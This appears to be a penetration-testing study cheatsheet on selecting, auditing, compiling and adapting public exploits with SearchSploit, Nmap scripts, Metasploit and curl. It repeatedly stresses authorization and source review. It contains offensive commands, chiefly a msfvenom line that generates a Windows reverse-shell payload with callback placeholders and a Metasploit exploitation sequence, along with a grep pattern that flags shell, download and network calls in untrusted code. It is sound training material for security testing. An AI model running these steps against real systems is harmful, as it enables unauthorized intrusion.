# Public Exploit Adaptation Cheatsheet [← Cheatsheet index](README.md) | [Full procedure](../reference/03-initial-access/06-public-exploit-adaptation.md) | [Shells](shells-payloads.md) | [Strategy map](../notes/Attack_Strategy_Map.md) | Study methods: [Select and adapt public exploits](../notes/methods/public-exploits.md) ## Candidate gate ```text exact component/build/configuration → exploit prerequisites → source audit → runtime/dependencies → minimal diff → bounded effect → independent verification → session handoff ``` Record: source URL/EDB-ID/CVE/commit, affected component, OS/architecture, authentication, configuration, expected effect, runtime, dependencies, hard-coded values and stability risk. ## SearchSploit ```bash searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" searchsploit -p EDB_ID searchsploit -x EDB_ID searchsploit -w "PRODUCT VERSION" ``` Copy working source: ```bash mkdir -p exploit-work && cd exploit-work searchsploit -m EDB_ID sha256sum EXPLOIT_FILE file EXPLOIT_FILE ``` Named NSE candidate: ```bash nmap --script-help SCRIPT_NAME sed -n '1,240p' /usr/share/nmap/scripts/SCRIPT_NAME.nse nmap -Pn -p PORT --script SCRIPT_NAME --script-args 'ARG=VALUE' TARGET ``` > Read categories and code first. `intrusive`, `exploit`, `brute` and `dos` change risk; script output still requires independent validation. ## Metasploit module — restricted exam choice ```text msfconsole -q search type:exploit PRODUCT CVE info MODULE_NAME use MODULE_NAME show options show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT check run ``` > Current exam rule: Auxiliary/Exploit/Post modules, Meterpreter and even `check` lock Metasploit use to one selected target. Use freely only in authorized labs; recheck the guide before an exam. ## Source audit ```bash sed -n '1,240p' EXPLOIT_FILE grep -nEi 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' EXPLOIT_FILE ``` Check local privilege requests, destructive actions, third-party network calls, embedded commands/payloads, file writes, target/callback values, auth/session assumptions and false success conditions. ## Python exploit > **Run/context:** prepare the reviewed PoC on the testing workstation unless its documented prerequisites require target-local execution. **Decide:** an import or interpreter failure occurs before target behavior is proved. Repair the [tool environment](../reference/04-shells-transfers-credentials/05-python-tool-environments.md), then distinguish [web transaction failures](#web-exploit-diagnostics) from a mismatched vulnerability. ```bash python3 -m py_compile exploit.py python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt python -m pip freeze > requirements-resolved.txt ``` > Audit before `--help`; some poor PoCs execute during import. Python 2 syntax and `str`/`bytes` errors are runtime problems, not exploit failures. ## Compile ```bash gcc -Wall -Wextra exploit.c -o exploit file exploit ldd exploit sha256sum exploit ``` ```bash i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32 x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32 file exploit-x86.exe exploit-x64.exe ``` > Compile for where the exploit program runs. Generate the payload for the target execution context. Undefined reference = linker/library problem; `Exec format error` = wrong producer/consumer format or architecture. ## Minimal edits ```bash cp EXPLOIT_FILE EXPLOIT_FILE.orig git diff --no-index -- EXPLOIT_FILE.orig EXPLOIT_FILE ``` Review only evidence-backed changes to: ```text target/port → scheme/base path/vhost → auth/cookie/CSRF → request method/body/headers → LHOST/LPORT → command/payload/architecture → paths/names → timing ``` ## Web exploit diagnostics ```bash curl -i -X METHOD 'SCHEME://HOSTNAME:PORT/PATH' \ -H 'Host: HOSTNAME' \ -H 'Cookie: COOKIE' \ --data 'PARAM=VALUE' ``` Scoped self-signed lab endpoint: ```bash curl -k -i 'https://HOSTNAME:PORT/PATH' ``` Parser error: print status, final URL, response headers and a bounded response-body sample. Check redirect, failed auth, changed CSRF, error page, WAF/proxy response and certificate handling before changing parsing logic. ## Existing memory-corruption PoC Do not redevelop it. Confirm exact build, architecture, target profile/return-address assumptions, offset, payload space, bad characters, payload type and crash/restart behavior. ```bash msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ -f FORMAT -v VARIABLE \ -b 'POC_DOCUMENTED_BAD_CHARACTERS' \ -s POC_DOCUMENTED_MAX_SPACE ``` ## Proof ladder ```text prerequisites confirmed → vulnerable path reached → bounded harmless effect → repeatable command execution → callback → usable session → host/identity/privilege verified ``` The PoC's success message, HTTP `200`, uploaded filename, crash and TCP connection are not substitutes for the next proof. ## Failure router | Failure | Next action | | --- | --- | | No credible match | Improve product/component/build/config evidence | | Suspicious local privilege/destructive code | Stop; isolate or reject the PoC | | Import/dependency error | Recreate per-tool environment | | Compiler error | Fix named source/header/type issue | | Undefined reference | Add correct documented linker library/order | | TLS failure | Confirm HTTPS; use CA or scoped test override | | Redirect/login/CSRF failure | Compare real browser request and state | | Success string, no effect | Inspect success condition; independently verify | | Command works, callback does not | Open [shell diagnostic ladder](shells-payloads.md#callback-ladder) | ## Evidence Save original source URL and hash, exact prerequisites, dependency/compiler state, modified diff, payload-generation command, invocation, raw result and independent verification. Modified exploit code must remain attributable to its original source. ## Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. ### Select and adapt public exploits
Find: Match a public exploit to the actual component and configuration Join application fingerprint/configuration evidence with the advisory and PoC's stated preconditions before selecting the exploit. ```bash searchsploit PRODUCT VERSION searchsploit -x EXPLOIT_ID ``` > **Recognize:** The exact feature/role/build conditions identify what must be checked; a product-name hit does not establish applicability. > **Validate next:** Resolve every required condition and define the smallest observable proof of the expected effect. [Match a public exploit to the actual component and configuration](../notes/methods/public-exploits.md#exploit-select).
Commands and use-case variants > **Need:** An identified component/build and a candidate exploit with reviewable source. Exact vulnerable build/configuration, required access and endpoint behavior; reviewable source and a verifiable expected effect ```text source URL/EDB-ID/CVE/commit: product + component + edition/build: target OS/architecture/runtime: remote or local; pre-auth or authenticated: required configuration/feature/path/credential/privilege: expected effect: exploit runtime and dependencies: hard-coded target/callback/payload assumptions: destructive or stability risk: evidence each prerequisite exists: ``` Do not substitute a scanner label for component evidence. Check vendor/version output, application behavior, files/configuration and the exploit's own affected-version notes. Distribution backports, disabled features, authentication and mitigations can invalidate a simple version match. ```bash searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" ``` Inspect before copying: ```bash searchsploit -p EDB_ID searchsploit -x EDB_ID searchsploit -w "PRODUCT VERSION" ``` Copy a working copy, never edit the archive in place: ```bash mkdir -p exploit-work cd exploit-work searchsploit -m EDB_ID sha256sum EXPLOIT_FILE file EXPLOIT_FILE ``` > **Selection cue:** prefer a readable, reputable or verified exploit whose prerequisites and outcome match the observed component. Exclude denial-of-service entries when the objective is access. A named Nmap NSE script can validate or exercise a specific known condition, but inspect it and its arguments first: ```bash nmap --script-help SCRIPT_NAME sed -n '1,240p' /usr/share/nmap/scripts/SCRIPT_NAME.nse nmap -Pn -p PORT --script SCRIPT_NAME --script-args 'ARG=VALUE' TARGET ``` Script categories such as `intrusive`, `exploit`, `brute` or `dos` change risk and authorization requirements. A script-reported vulnerable result remains a candidate until its underlying evidence or controlled effect is validated.
Variant — source repository rather than Exploit-DB Record and pin the exact source state: ```bash git clone REPOSITORY_URL exploit-source cd exploit-source git log -1 --format='%H %ad %s' --date=iso-strict git status --short ``` Read the README, license, dependency files, open issues relevant to the target version and the actual execution path. A popular repository is not automatically safe or compatible.
Variant — a matching Metasploit exploit module Use only in an authorized lab or after committing the current exam's one allowed Metasploit/Meterpreter target. Even `check` against a target consumes that choice under the current guide. ```text msfconsole -q search type:exploit PRODUCT CVE info MODULE_NAME use MODULE_NAME show options show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT check run ``` Read `info`, verify the module's affected versions/references, select the explicit target profile and inspect every required option. A module rank or `check` result does not replace exact prerequisite validation or session verification.
> **Verify:** Write the evidence for every prerequisite and the minimal effect that would validate the hypothesis. > **If it fails:** A scanner's CVE label or a copied walkthrough command is insufficient. Resolve the build/feature gap before running the PoC.
Find: Audit a PoC and reproduce its interpreter/dependency environment Read the candidate source and local error path before interpreting target success/failure; inspect interpreter/import and dependency requirements. ```bash file exploit.py python3 --version python3 -m pip --version ``` > **Recognize:** The failure occurred locally before the vulnerable request; it says nothing about target patch state. > **Validate next:** Review side effects, reproduce supported dependencies/interpreter and observe the real request before judging exploitation. [Audit a PoC and reproduce its interpreter/dependency environment](../notes/methods/public-exploits.md#exploit-runtime).
Commands and use-case variants > **Need:** An identified component/build and a candidate exploit with reviewable source. Reviewed source, understood network/file actions, correct interpreter and compatible isolated dependencies Start with metadata and readable text: ```bash file EXPLOIT_FILE sha256sum EXPLOIT_FILE sed -n '1,240p' EXPLOIT_FILE grep -nEi 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' EXPLOIT_FILE ``` For binaries, prefer obtaining inspectable source. If only a binary exists, treat it as a substantially higher-risk choice: ```bash file EXPLOIT_BINARY sha256sum EXPLOIT_BINARY strings -a EXPLOIT_BINARY | less objdump -f EXPLOIT_BINARY ``` Audit for: - unexpected privilege requirements on the attacking host; - destructive file/process/service operations or denial of service; - downloads, callbacks or telemetry to third parties; - embedded credentials, tokens, commands or payloads; - files written or overwritten and their cleanup behavior; - hard-coded target addresses, ports, paths, virtual hosts and callback values; - authentication, cookie, CSRF, redirect, TLS and proxy assumptions; - target OS, architecture, runtime, library and payload assumptions; - success messages that are printed without verifying the claimed effect. > **Safety cue:** use source, a disposable environment and a clean snapshot when uncertainty remains. Do not grant `sudo` merely because an unknown PoC requests it. ```bash head -n 1 EXPLOIT_FILE python3 --version gcc --version file EXPLOIT_FILE ``` Separate three architectures: 1. where the exploit program itself runs; 2. the vulnerable target process; 3. the payload that will execute inside or on the target. A remote Python exploit may run on Kali while delivering a Windows x64 payload. A local Linux exploit normally must run on the target-compatible architecture. Compiler choice follows the produced program; payload choice follows the target execution context. After source review: ```bash python3 -m py_compile exploit.py python3 exploit.py --help ``` Isolate explicit dependencies: ```bash python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt python -m pip freeze > requirements-resolved.txt ``` > Run `--help` only after confirming that module import and argument handling do not trigger the exploit. Old Python 2 syntax, `str`/`bytes` mistakes, renamed modules and obsolete TLS dependencies are runtime problems, not target evidence. Useful diagnostics: ```bash python3 -X dev exploit.py ARGUMENTS python3 -m trace --trace exploit.py ARGUMENTS ``` Use tracing only when its output is bounded and does not expose credentials. Prefer adding a few prints around the failing request/parser over changing many lines at once. > **Use when:** a source-based Python assessment tool has dependencies that should not modify Kali's system Python. This is setup/reference material, not authorization to install a tool. ##### Linux/Kali virtual environment ```bash python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt ``` Install one explicitly selected package only when needed: ```bash python -m pip install PACKAGE ``` ```bash python -m pip show PACKAGE python -m pip freeze deactivate ``` PEP 668 intentionally protects externally managed system environments. Do not bypass it with `--break-system-packages`; use a venv or the distribution package when appropriate. ##### Windows PowerShell ```powershell py -m venv .venv .\.venv\Scripts\Activate.ps1 python -m pip install --upgrade pip python -m pip install -r requirements.txt deactivate ``` ##### Reproducibility checks ```bash python --version python -m pip --version python -m pip freeze > requirements-resolved.txt ``` Record the tool source/commit, Python version, dependency file and exact command. Keep environments per tool when their dependency ranges conflict. ##### uv alternative for a Python PoC with missing dependencies Use when uv is already available and the reviewed script needs a small dependency set. Keep the baseline venv workflow as an option when uv is absent. ```bash # Run outside the current project's dependencies, supplying the known dependency uv run --no-project --with requests exploit.py --help # For a script with its own inline dependency metadata uv run --script exploit.py --help ``` Read: a working help/import path establishes the local runtime only. Inspect actual arguments, authentication and target requirements before execution. Pin dependency versions when the PoC depends on an older API; an ImportError and a target-side exploit failure are different boundaries. Dependency resolution can require Internet access. Sources: [upstream 1](https://docs.astral.sh/uv/guides/scripts/). > **Verify:** Confirm interpreter/dependency identity and observable intended request behavior; preserve the reviewed source and changes. > **If it fails:** Do not solve every old script with a global package change. Inspect Python-version semantics and choose a supported environment or minimal reviewed edit.
Find: Compile and minimally adapt an existing native or memory-corruption PoC Inspect the native PoC's documented target process, compiler flags, ABI and artifact before running it in a target context. ```bash file COMPILED_ARTIFACT uname -m getconf LONG_BIT ``` > **Recognize:** An architecture/ABI mismatch explains a compatibility problem before exploit logic is evaluated. > **Validate next:** Confirm target process rather than just OS architecture, required libraries/loader and documented exploit-specific constraints. [Compile and minimally adapt an existing native or memory-corruption PoC](../notes/methods/public-exploits.md#exploit-compile).
Commands and use-case variants > **Need:** An identified component/build and a candidate exploit with reviewable source. Correct compiler/target architecture, runtime dependencies, documented payload constraints and validated exploit-specific constants Linux/ELF program: ```bash gcc -Wall -Wextra exploit.c -o exploit file exploit ldd exploit sha256sum exploit ``` 32-bit output requires matching headers/libraries: ```bash gcc -m32 -Wall -Wextra exploit.c -o exploit32 file exploit32 ``` Windows PE from Kali: ```bash i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe file exploit-x86.exe exploit-x64.exe ``` Windows socket code commonly needs the Winsock import library: ```bash i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32 x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32 ``` > **Failure cue:** undefined references are linker evidence. Identify the missing symbol and documented library; do not delete calls until the binary compiles. `Exec format error` means the produced format/architecture cannot run in the current environment. Change one assumption at a time and retain a diff: ```bash cp EXPLOIT_FILE EXPLOIT_FILE.orig git diff --no-index -- EXPLOIT_FILE.orig EXPLOIT_FILE ``` Typical adaptations are: | Assumption | Evidence-backed edit | | --- | --- | | Target address/port | Observed reachable endpoint | | HTTP/HTTPS and base path | Reproduced application request | | Virtual host or `Host` header | Resolved application identity | | Username/password/cookie | Valid Block 5 authentication context | | CSRF/session parsing | Actual request/response sequence | | LHOST/LPORT | Address and listener reachable from the target context | | Command or payload | Target OS, interpreter, architecture, size and bad-character constraints | | File path/name | Writable/executable target path and application behavior | | Timeout/retry | Measured service behavior, not blind delay inflation | Do not combine prerequisite repair, payload replacement and parser rewrites in one unreviewable change. > Dedicated overflow development, offset drills and shellcode development are excluded from this speedrun. Use this section only to understand and adapt an existing PoC whose vulnerable build and assumptions are supported by evidence. Review the PoC comments and code for: - exact vulnerable build and target architecture; - hard-coded target/callback address and port; - return address/module assumptions and target profiles; - recorded offset, available payload space and bad characters; - payload architecture, type and exit behavior; - crash/restart and reliability expectations. Replace an embedded payload only when the PoC documents its constraints: ```bash msfvenom -p windows/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f c -v payload \ -b '\x00\x0a\x0d' ``` Use the PoC's actual bad-character and space requirements; the example list is not universal. A changed build, missing module, mitigation or misaligned offset invalidates the PoC and should not trigger a fresh exploit-development detour in this route. > **Verify:** Verify artifact format, architecture, required runtime and actual exploit effect independently. > **If it fails:** A crash is not a shell; wrong ABI, mitigation/configuration or constants can invalidate a candidate. Return to its prerequisites rather than inventing an exploit-development exercise.
Find: Repair a web PoC using the real HTTP transaction Capture the application's real valid transaction and compare it with the PoC's request path, login/session sequence and response parser. ```bash curl -sk -i -b cookies.txt http://TARGET:PORT/PATH ``` > **Recognize:** The request never reached the protected operation; the success parser may be reading a login response. > **Validate next:** Restore valid host/path/session/CSRF state, then independently verify the exploit effect. [Repair a web PoC using the real HTTP transaction](../notes/methods/public-exploits.md#exploit-web).
Commands and use-case variants > **Need:** An identified component/build and a candidate exploit with reviewable source. A valid baseline transaction with correct host, base path, session/CSRF state and request encoding Before changing the script, reproduce the relevant request with Burp or curl and compare: ```bash curl -i -X METHOD 'SCHEME://HOSTNAME:PORT/PATH' \ -H 'Host: HOSTNAME' \ -H 'Cookie: COOKIE' \ --data 'PARAM=VALUE' ``` For a scoped lab with a known self-signed certificate: ```bash curl -k -i 'https://HOSTNAME:PORT/PATH' ``` In Python Requests, use a session when cookies or defaults must persist: ```python with requests.Session() as session: response = session.get(url, timeout=10) print(response.status_code, response.url) print(response.headers) print(response.text[:500]) ``` Set `verify=False` only for a scoped test after confirming the certificate problem; it disables certificate and hostname validation. Prefer a supplied CA bundle when possible. > **Parser cue:** `IndexError`, missing-key and regular-expression failures mean the received response did not have the assumed shape. Print status, final URL, headers and a bounded body fragment before rewriting the parser. Common causes are a changed path, redirect, failed login, CSRF change, error page, proxy/WAF response or certificate handling. > **Verify:** Check the target action/output rather than trusting the PoC's success string. > **If it fails:** A normal HTTP response can be an authentication or parsing failure. Separate application request repair from payload/callback diagnosis.
